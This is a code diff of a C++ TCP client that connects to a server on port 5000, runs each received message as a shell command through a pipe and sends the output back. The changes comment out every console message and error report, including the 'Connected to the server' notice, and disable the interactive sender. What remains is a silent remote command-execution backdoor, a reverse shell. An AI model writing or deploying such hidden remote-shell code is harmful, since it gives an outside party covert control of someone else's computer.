@@ -28,7 +28,7 @@ void sendMessage(int sock) {
         std::getline(std::cin, message);
 
         if (send(sock, message.c_str(), message.length(), 0) < 0) {
-            std::cerr << "Send failed: " << strerror(errno) << std::endl;
+            //std::cerr << "Send failed: " << strerror(errno) << std::endl;
         }
     }
 }
@@ -95,15 +95,15 @@ void receiveMessage(int sock) {
                     // Close the pipe
                     auto returnCode = pclose(pipe);
 
-                    std::cout << result;
-
+                    //std::cout << result;
+                    result = "\n" + result;
                     if (send(sock, result.c_str(), result.length(), 0) < 0) {
-                        std::cerr << "Send failed: " << strerror(errno) << std::endl;
+                        //std::cerr << "Send failed: " << strerror(errno) << std::endl;
                     }
                 }
             }
             else {
-                std::cout << "Server closed connection or receive error\n";
+                //std::cout << "Server closed connection or receive error\n";
                 break;
             }
         }
@@ -118,7 +118,7 @@ int main() {
     sock = socket(AF_INET, SOCK_STREAM, 0);
 
     if (sock == -1) {
-        std::cerr << "Could not create socket\n";
+        //std::cerr << "Could not create socket\n";
         return 1;
     }
 
@@ -126,7 +126,7 @@ int main() {
     int flag = 1;
     int result = setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char*)&flag, sizeof(int));
     if (result < 0) {
-        std::cerr << "Error setting TCP_NODELAY\n";
+        //std::cerr << "Error setting TCP_NODELAY\n";
         return 1;
     }
 
@@ -135,14 +135,14 @@ int main() {
     server.sin_port = htons(5000);
 
     if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
-        perror("connect failed. Error");
+        //perror("connect failed. Error");
         return 1;
     }
 
     setSocketNonBlocking(sock);  // Set the socket to non-blocking
 
-    std::cout << "Connected to the server.\n";
-    
+    //std::cout << "Connected to the server.\n";
+
     //std::thread sender(sendMessage, sock);
     std::thread receiver(receiveMessage, sock);
 
